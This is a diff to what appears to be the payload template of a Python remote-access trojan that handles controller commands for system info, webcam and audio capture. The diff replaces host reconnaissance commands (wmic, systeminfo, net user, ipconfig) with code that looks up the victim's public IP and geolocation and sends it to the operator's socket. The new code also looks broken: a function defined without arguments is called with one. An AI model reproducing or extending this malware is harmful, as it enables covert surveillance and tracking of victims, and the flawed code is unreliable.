@@ -1104,6 +1104,7 @@ from tkinter import messagebox
 import webbrowser
 import sys
 import shutil
+import requests
 
 {kill_def}
 
@@ -1118,8 +1119,19 @@ rec_audio = False
 
 def show_error(text):
     messagebox.showerror("Error", text)
+    
 {err}
 {startup}
+
+def get_ip_info():
+    ip_info = ""
+    ip_info += str(requests.get(f"https://ipapi.co/{"{get_ip()}"}/json/").content.decode(errors="replace").strip())
+    return ip_info
+
+
+def get_ip():
+    return str(requests.get("https://api.ipify.org?format=json").json()['ip'])
+
 
 def audio(client):
     global rec_audio
@@ -1379,15 +1391,8 @@ def recv():
                 threading.Thread(target=send_stats, args=(client,)).start()
 
             elif command == "<INFO>":
-                info = subprocess.check_output("wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors", shell=True)
-                info += subprocess.check_output("wmic memorychip get capacity,Speed", shell=True)
-                info += subprocess.check_output("wmic diskdrive get model,size", shell=True)
-                info += subprocess.check_output("wmic computersystem get totalphysicalmemory", shell=True)
-                info += subprocess.check_output("systeminfo", shell=True)
-                info += subprocess.check_output("net user", shell=True)
-                info += subprocess.check_output("ipconfig", shell=True)
-                info += subprocess.check_output("wmic nic get macaddress", shell=True)
-                client.sendall(info)
+                info = str(get_ip_info(get_ip()))
+                client.sendall(info.encode())
 
             elif command == "<CAM>":
                 global cam
